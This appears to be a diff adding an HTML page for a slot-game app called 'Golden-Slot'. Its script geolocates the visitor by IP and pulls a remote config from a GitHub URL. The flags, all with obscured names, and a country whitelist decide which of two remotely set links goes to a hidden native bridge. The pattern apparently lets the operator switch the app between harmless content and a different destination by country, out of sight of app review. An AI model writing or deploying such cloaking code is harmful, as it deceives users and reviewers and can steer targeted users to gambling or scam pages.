@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+            <meta charset="UTF-8">
+            <title>Golden-Slot</title>
+        </head>
+        <body style="background-color:black;">
+        <script type="text/javascript">
+            const config = {
+                status: false,
+                cl: false,
+                cll: false,
+                wi: "",
+                tu: "",
+                lev: 0,
+                m: 0,
+                gg: "",
+                ip: "",
+                step: 0,
+                country_code: ""
+            };
+
+            function getIp() {
+                const ipUrl = "https://api.country.is";
+                const ajax = new XMLHttpRequest();
+                ajax.open('get', ipUrl);
+                ajax.send();
+                ajax.onreadystatechange = function () {
+                    if (ajax.readyState === 4 && ajax.status === 200) {
+                        const res = JSON.parse(ajax.responseText);
+                        config.ip = res.ip;
+                        config.country_code = res.country;
+                        console.log(res);
+                        handleNav();
+                    }
+                }
+            }
+
+            getIp();
+
+            function fetchConfig() {
+                const ipUrl = "https://raw.githubusercontent.com/jtao7549/config/main/config.json";
+                const ajax = new XMLHttpRequest();
+                ajax.open('get', ipUrl);
+                ajax.send();
+                ajax.onreadystatechange = function () {
+                    if (ajax.readyState === 4 && ajax.status === 200) {
+                        setConfig(ajax.responseText);
+                    }
+                }
+            }
+
+            fetchConfig();
+
+            function handleNav() {
+                if (++config.step < 2) {
+                    return;
+                }
+                if (config.status && config.tu !== "") {
+                    if (config.cl || config.cll) {
+                        if (config.lev === 1) {
+                                if (config.wi != null && config.wi.length > 0) {
+                                if (config.country_code != null && config.country_code.length > 0) {
+                                    if (config.wi.indexOf(config.country_code) > -1) {
+                                        handleNative(config.m === 0 ? 1 : 2);
+                                        return;
+                                    }
+                                }
+                            } else if (config.m === 0) {
+                                handleNative(1);
+                                return;
+                            } else {
+                                handleNative(1);
+                            }
+                        } else {
+                            handleNative(2);
+                        }
+                    } else if (config.lev === 1 && config.m !== 0) {
+                        handleNative(2);
+                        return;
+                    }
+                }
+                handleNative(0);
+            }
+
+            function setConfig(json) {
+                const obj = JSON.parse(json);
+                config.status = obj.status;
+                config.cl = obj.cl;
+                config.cll = obj.cll;
+                config.wi = obj.wi;
+                config.tu = obj.tu;
+                config.lev = obj.lev;
+                config.m = obj.m;
+                config.gg = obj.gg;
+                handleNav();
+            }
+
+            function handleNative(type) {
+                let res = {
+                    num: type,
+                    link: type === 0 ? config.gg : config.tu
+                };
+                console.log(res);
+                window.dehgh.ddlash(JSON.stringify(res));
+            }
+          </script>
+
+        </body></html>
